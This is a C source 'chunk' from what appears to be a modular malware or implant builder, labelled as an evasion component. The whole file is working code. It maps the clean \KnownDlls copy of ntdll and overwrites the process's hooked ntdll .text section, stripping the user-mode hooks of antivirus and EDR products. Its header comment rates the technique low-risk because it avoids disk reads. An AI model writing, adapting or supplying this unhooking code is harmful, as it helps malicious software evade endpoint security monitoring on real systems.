// chunk: evasion/unhook_knowndlls
// depends: (none)
// provides: unhook_ntdll
// headers: windows.h
// risk: low
// note: Restores ntdll .text from KnownDlls section object — no disk read, no suspicious file I/O. Opens \\KnownDlls\\ntdll.dll section, maps it, copies clean .text over hooked .text.

#ifndef CHUNK_UNHOOK_KNOWNDLLS
#define CHUNK_UNHOOK_KNOWNDLLS

typedef struct _UNICODE_STRING_NT {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING_NT;

typedef struct _OBJECT_ATTRIBUTES_NT {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING_NT *ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES_NT;

typedef NTSTATUS (NTAPI *pfnNtOpenSection)(PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_NT *);
typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);

#define OBJ_CASE_INSENSITIVE_VAL 0x00000040

static int unhook_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnNtOpenSection pNtOpenSection = (pfnNtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
    pfnNtMapViewOfSection pNtMapView = (pfnNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    pfnNtUnmapViewOfSection pNtUnmapView = (pfnNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

    if (!pNtOpenSection || !pNtMapView || !pNtUnmapView) return 0;

    // Open \KnownDlls\ntdll.dll section
    WCHAR section_name[] = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING_NT us;
    us.Buffer = section_name;
    us.Length = (USHORT)(wcslen(section_name) * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES_NT oa;
    memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);
    oa.ObjectName = &us;
    oa.Attributes = OBJ_CASE_INSENSITIVE_VAL;

    HANDLE hSection = NULL;
    NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    if (status != 0 || !hSection) return 0;

    // Map the clean section
    PVOID clean_base = NULL;
    SIZE_T view_size = 0;
    status = pNtMapView(hSection, GetCurrentProcess(), &clean_base, 0, 0, NULL, &view_size, 1, 0, PAGE_READONLY);
    if (status != 0 || !clean_base) {
        CloseHandle(hSection);
        return 0;
    }

    // Find .text section in both copies
    BYTE *hooked_base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)hooked_base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(hooked_base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    int restored = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *hooked_text = hooked_base + sec[i].VirtualAddress;
            BYTE *clean_text = (BYTE *)clean_base + sec[i].VirtualAddress;
            DWORD text_size = sec[i].Misc.VirtualSize;

            DWORD old_protect;
            VirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &old_protect);
            memcpy(hooked_text, clean_text, text_size);
            VirtualProtect(hooked_text, text_size, old_protect, &old_protect);
            restored = 1;
            break;
        }
    }

    pNtUnmapView(GetCurrentProcess(), clean_base);
    CloseHandle(hSection);

    return restored;
}

#endif
